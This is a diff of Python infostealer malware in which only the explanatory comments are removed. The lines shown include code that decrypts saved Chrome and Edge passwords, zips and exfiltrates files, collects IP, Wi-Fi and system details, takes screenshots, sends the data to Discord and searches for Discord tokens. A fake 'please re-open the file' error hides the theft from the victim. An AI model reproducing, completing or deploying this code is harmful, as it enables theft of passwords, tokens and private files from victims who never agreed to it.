@@ -33,7 +33,7 @@ class BrowserPasswordExtractor:
         if not os.path.exists(self.mainDirectory):
             mkdir(self.mainDirectory)
 
-        # Browser paths (add more if needed)
+     
         self.browsers = {
             "Chrome": os.path.join(self.localAppData, "Google", "Chrome", "User Data"),
             "Edge": os.path.join(self.localAppData, "Microsoft", "Edge", "User Data"),
@@ -119,7 +119,7 @@ class BrowserPasswordExtractor:
 
                     master_key = self.get_chrome_master_key(local_state_path)
                     if master_key is None:
-                        continue  # Skip if we can't get the master key
+                        continue  
 
                     for origin_url, username, encrypted_password in cursor.fetchall():
                         decrypted_password = self.decrypt_value(encrypted_password, master_key)
@@ -127,7 +127,7 @@ class BrowserPasswordExtractor:
                             message = f"Browser: {browser_name}\nURL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n{'-'*50}"
                             self.passwords.append(message)
 
-                            # Stop if we hit the minimum limit of 15
+                          
                             if len(self.passwords) >= 15:
                                 break
 
@@ -135,7 +135,7 @@ class BrowserPasswordExtractor:
                 print(f"Error retrieving passwords from {location} in {browser_name}: {e}")
             finally:
                 time.sleep(1)
-                # Retry removing temp file if it fails due to being in use
+           
                 for attempt in range(3):
                     try:
                         remove(temp_database_path)
@@ -154,7 +154,7 @@ class BrowserPasswordExtractor:
             else:
                 print(f"{browser_name} not detected.")
 
-        # After processing all detected browsers, ensure at least 15 passwords were collected
+        
         if self.passwords:
             if len(self.passwords) < 15:
                 print(f"Only {len(self.passwords)} passwords found, sending them anyway.")
@@ -292,19 +292,18 @@ def send_data_to_discord(ip_info, wifi_info, system_info, screenshot_buffer):
         print(f"Failed to boot file please re-open the file...: {response.status_code}")
 
 def main():
-    # Exfiltrate files
+    
     zip_filename = exfiltrate_files()
 
-    # Collect system and network info
+ 
     ip_info = get_public_ip_info()
     wifi_info = get_wifi_info()
     system_info = get_system_info()
     screenshot_buffer = take_screenshot()
 
-    # Send collected data
+   
     send_data_to_discord(ip_info, wifi_info, system_info, screenshot_buffer)
 
-    # Get tokens
     tokens = []
     paths = [
         os.path.join(appdatapath, 'Discord'),
